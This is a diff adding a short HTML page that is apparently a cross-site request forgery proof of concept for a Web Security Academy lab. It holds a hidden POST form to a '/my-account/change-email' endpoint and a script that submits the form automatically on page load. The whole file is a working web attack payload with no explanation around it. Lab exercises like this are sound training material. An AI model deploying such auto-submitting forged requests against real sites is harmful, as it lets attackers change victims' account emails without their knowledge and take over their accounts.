@@ -1,0 +1,8 @@
+<form action="https://0a600026033ba86d807cee6c00f400b1.web-security-academy.net/my-account/change-email" method="POST">
+        <input required type="email" name="email" value="">
+        <button class='button' type='submit'> Update email </button>
+</form>
+
+<script>
+	document.forms[0].submit();
+</script>
